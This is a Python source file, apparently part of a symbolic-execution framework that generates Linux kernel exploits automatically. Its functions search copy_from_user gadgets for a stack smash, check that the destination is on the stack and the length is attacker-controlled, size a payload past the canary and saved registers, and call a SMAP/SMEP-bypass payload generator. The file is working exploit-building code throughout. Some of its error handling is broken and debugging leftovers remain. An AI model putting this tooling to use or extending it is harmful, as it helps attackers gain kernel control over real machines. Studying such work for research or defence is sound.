"""
filename: _smash_gadget.py
Author: ww9210
try different copy_from_user gadget to perform stack smash :)
"""
import traceback
import colorama
from IPython import embed
from .state_filters import *


class SmashGadgetMixin:
    def explore_state_for_second_fork_site(self, good_disclosure_state):
        """
        explore from the disclosure site for the second fork site
        :param good_disclosure_state:
        :return: candidate_states: unconstrained states potential helpful for smash
        """
        candidate_states = []
        reach_target_fork_site = False
        disclosure_states = []
        disclosure_state = good_disclosure_state[0]
        self.current_bloom_gadget = good_disclosure_state[1]
        self.current_forking_gadget = good_disclosure_state[2]
        self.current_prologue_gadget = good_disclosure_state[3]
        self.current_disclosure_gadget = good_disclosure_state[4]
        self.current_firstly_reached_fork_site = good_disclosure_state[5]
        # bloom_entry, bloom_site = self.get_blooming_gadget_entry_and_site(self.current_bloom_gadget)
        fork_entry, first_fork_site, second_fork_site = \
            self.get_forking_gadget_entry_and_sites(self.current_forking_gadget)
        if self.current_firstly_reached_fork_site == 2:
            # swap order if we firstly see second fork site
            first_fork_site, second_fork_site = second_fork_site, first_fork_site
        if self.current_firstly_reached_fork_site == 3:
            second_fork_site = first_fork_site
        if self.current_firstly_reached_fork_site == 4:
            first_fork_site = second_fork_site

        # currently we are in the entry of copy_to_user, so let's mimic a directly return from the site
        # as well as setting rax to non-zero value
        print('debug explore_state_for_second_fork_site')
        self.dump_stack(disclosure_state)
        twin_disclosure_state = disclosure_state.copy()
        # embed()
        return_address = disclosure_state.se.eval(disclosure_state.memory.load(disclosure_state.regs.rsp, 8).reversed)

        """
   Dump of assembler code for function _copy_to_user:
   0xffffffff813ead80 <+0>:	    mov    rax,QWORD PTR gs:0x14d80
   0xffffffff813ead89 <+9>:	    mov    rcx,QWORD PTR [rax+0xa20]
   0xffffffff813ead90 <+16>:	mov    rax,rdi
   0xffffffff813ead93 <+19>:	add    rax,rdx
   0xffffffff813ead96 <+22>:	jb     0xffffffff813eada4 <_copy_to_user+36>
   0xffffffff813ead98 <+24>:	cmp    rcx,rax
   0xffffffff813ead9b <+27>:	jb     0xffffffff813eada4 <_copy_to_user+36>
   0xffffffff813ead9d <+29>:	call   0xffffffff81a08d80 <copy_user_generic_unrolled>
   0xffffffff813eada2 <+34>:	mov    edx,eax
   0xffffffff813eada4 <+36>:	mov    rax,rdx  <- rdx == rax here
   0xffffffff813eada7 <+39>:	ret
   End of assembler dump."""
        # this is the normal return path with rax set to 0
        # assign new value of rsp
        disclosure_state.regs.rsp = disclosure_state.regs.rsp + 8
        # assign rax to non-zero value
        disclosure_state.regs.rax = 0
        # assign new value of rip
        disclosure_state.regs.rip = return_address

        # this is the quick return state with rax set to 0xfffffff2
        # assign new value of rsp
        twin_disclosure_state.regs.rsp = disclosure_state.regs.rsp + 8
        # assign rax to -EFAULT
        twin_disclosure_state.regs.rax = 0xfffffff2  # -EFAULT
        # assign new value of rip
        twin_disclosure_state.regs.rip = return_address

        # append both result
        disclosure_states.append(twin_disclosure_state)
        disclosure_states.append(disclosure_state)

        target_fork_site = second_fork_site
        print('target fork site is: %x' % target_fork_site)

        # create a simulation manager
        simgr = self.b.factory.simgr(disclosure_states, save_unconstrained=True)
        #input('inspect the state now?')
        #import IPython; IPython.embed()
        loop_idx = 0
        while True:
            print('[+] ' + str(loop_idx) + ' step()')
            try:
                print('[+] stepping')
                simgr.step(stash='active')
                #print(simgr.active)
                #print('[+] removing state with bad rip to deadended stash')
                simgr.move(from_stash='active', to_stash='deadended', filter_func=filter_bad_rip)
                for deadend_state in simgr.deadended:
                    simgr.deadended.remove(deadend_state)
                loop_idx += 1

            except all as e:
                print(e)
                print('wtf simgr error')
                traceback.print_exc()
                input()
                del simgr
                break

            # has unconstrained states
            if simgr.unconstrained:
                for ucstate in simgr.unconstrained:
                    candidate_states.append(ucstate.copy())
                    if target_fork_site in self.b.factory.block(ucstate.history.addr).instruction_addrs:
                        reach_target_fork_site = True
                    simgr.unconstrained.remove(ucstate)
                    # import IPython; IPython.embed()
            if loop_idx > 7:
                #print('too many steps...aborting...')
                del simgr
                break

            if reach_target_fork_site:  # already the target fork site
                #print('already reach target fork site, stop exploring')
                del simgr
                break

        return candidate_states

    def is_good_smash_site(self, active_state):
        """
        check is the state satisfy the requirement to smash the stack
        :param active_state:
        :return:
        """
        state = active_state.copy()
        print('evaluating smash state...')
        #self.debug_state(state)
        # check if rdi is stack location
        if self.is_stack_address(state, state.se.eval(state.regs.rdi)):
            print('[+] rdi points to stack')
            # check if rsi is user space location
            state.add_constraints(state.regs.rsi < 0x7fff00000000)
            state.add_constraints(state.regs.rsi > 0x10000)
            # check if rdx is symbolic value
            if state.regs.rdx.symbolic:
                print('[+] rdx is symbolic')
                number_of_saved_register = self.current_smash_gadget[0]
                canary_position = self.current_smash_gadget[1]
                if self.reproduce_mode:  # in reproduce mode, we concretize payload length to concrete value
                    minimal_smash_payload_len = canary_position + 8 + number_of_saved_register * 8 + 8 * self.custom_rop_gadget_number
                    state.add_constraints(state.regs.rdx > minimal_smash_payload_len)
                    state.add_constraints(state.regs.rdx < 0x200)
                else:
                    minimal_smash_payload_len = canary_position + 8 + number_of_saved_register * 8 + 32
                    state.add_constraints(state.regs.rdx > minimal_smash_payload_len)
                    state.add_constraints(state.regs.rdx < 0x200)
                if state.satisfiable():
                    print(colorama.Fore.MAGENTA, '[+] rsi could point to user space with legit copy length :)',\
                        colorama.Style.RESET_ALL)
                    self.current_smash_payload_len = minimal_smash_payload_len
                    print('blooming gadget', self.current_bloom_gadget[1])
                    print('forking gadget', self.current_forking_gadget[1])
                    print('prologue gadget', self.current_prologue_gadget[5])
                    print('disclosure gadget:', self.current_disclosure_gadget[3])
                    print('smash gadget:', self.current_smash_gadget[3])
                    # embed()
                    del state
                    return True
                else:
                    if self.reproduce_mode:
                        #embed()
                        pass
                    print('rdx', state.regs.rdx)
                    print('rsi', state.regs.rsi)
                    for constrain in state.history.actions:
                        print(constrain)
                    print('[!] not satisfiable')
        else:
            print('rdi does not point to stack..')
        del state
        return False

    def analyze_smash_gadget(self, smash_gadget):
        """
        analyze smash gadget
        :param smash_gadget:
        :return: list of sub gadget entries
        """
        try:
            sub_gadget_entry = []
            seen_rdx = False
            seen_rsi = False
            seen_rdi = False
            for sub_entry in smash_gadget[4]:
                if seen_rdx and seen_rsi and seen_rdi:
                    break
                if 'dst' in sub_entry:
                    if not seen_rdi and sub_entry['dst'] == 'rdi':
                        seen_rdi = True
                    elif not seen_rsi and sub_entry['dst'] == 'rsi':
                        seen_rsi = True
                    elif not seen_rdx and sub_entry['dst'] == 'rdx':
                        seen_rdx = True
                    sub_gadget_entry.append(sub_entry['addr'])
                else:
                    sub_gadget_entry.append(sub_entry['addr'])
            return sub_gadget_entry
        except KeyError as e:
            print(e)
            traceback.print_exc()
            embed()

    def run_rsp_smash_gadget(self, states, smash_gadget, store_smash_state=True):
        good_smash_state = []
        self.current_smash_gadget = smash_gadget
        sub_gadget_entry = self.analyze_smash_gadget(self.current_smash_gadget)
        new_states = []
        for state in states:
            for gadget_entry in sub_gadget_entry:
                # copy states
                new_state = state.copy()
                # constraining new_state
                new_state.add_constraints(new_state.regs.rip == gadget_entry)
                # append state to new_states list which will be used in simulation manager
                new_states.append(new_state)

        simgr = self.b.factory.simgr(new_states, save_unconstrained=True)
        # we are only one step away from the site
        print('stepping to the smash site')
        simgr.step()  # we need only a single step to reach the stack smash site
        # check all active states for good smash state
        for active_state in simgr.stashes['active']:
            print(active_state)
            # check if smash requirements are satisfied
            if self.is_good_smash_site(active_state):
                print(colorama.Fore.RED + 'found good smash state...' + colorama.Style.RESET_ALL)
                if store_smash_state is True:
                    good_smash_state.append([active_state.copy(), self.current_bloom_gadget, self.current_forking_gadget
                                            , self.current_prologue_gadget, self.current_disclosure_gadget
                                            , self.current_smash_gadget])
                else:
                    good_smash_state.append([self.current_bloom_gadget, self.current_forking_gadget
                                            , self.current_prologue_gadget, self.current_disclosure_gadget
                                            , self.current_smash_gadget])
                # try payload generation
                print('[+] try generating payload...')
                success = self.gen_payload_smap_smep_bypass(active_state)
                del active_state
                if success:
                    break
                # embed()

        del simgr
        del new_states
        return list(good_smash_state)

    def run_rbp_smash_gadget(self, states, smash_gadget, store_smash_state=True):
        """
        should be the same with rsp smash gadget, if I did not miss something because I feel a little weired
        :param states:
        :param smash_gadget:
        :param store_smash_state:
        :return:
        """
        return self.run_rsp_smash_gadget(states, smash_gadget, store_smash_state)

    def multiple_runs_smash_gadgets(self, good_disclosure_state, store_smash_state=True):
        """
        iterate over various smash gadget and check if smash requirement can be satisfied
        :param good_disclosure_state:
        :param store_smash_state:
        :return: if found at least one good smash gadget, return True, otherwise False
        """
        res = False
        # firstly try to explore until the second fork site state.
        second_fork_site_state = self.explore_state_for_second_fork_site(good_disclosure_state)
        if len(second_fork_site_state) == 0:
            print('cannot find second fork site')
            return False
        else:
            print(colorama.Fore.CYAN + 'successfully found %d second fork site' % len(second_fork_site_state)\
                + colorama.Style.RESET_ALL)
            # embed()
            for i, smash_gadget in enumerate(self.smash_gadgets):
                print('^^^^^^ checking %d/%d smash gadget ^^^^^^' % (i, len(self.smash_gadgets)))
                # currently we do not handle rbp gadgets
                if smash_gadget[2] == 'rsp':
                    print('rsp smash gadget')
                    good_smash_states = self.run_rsp_smash_gadget(second_fork_site_state, smash_gadget, store_smash_state)
                    if len(good_smash_states) > 0:
                        self.good_smash_states += list(good_smash_states)
                        res = True
                    del good_smash_states
                elif smash_gadget[2] == 'rbp':
                    print('rbp smash gadget')
                    good_smash_states = self.run_rbp_smash_gadget(second_fork_site_state, smash_gadget, store_smash_state)
                    if len(good_smash_states) > 0:
                        self.good_smash_states += list(good_smash_states)
                        res = True
                    del good_smash_states
        return res
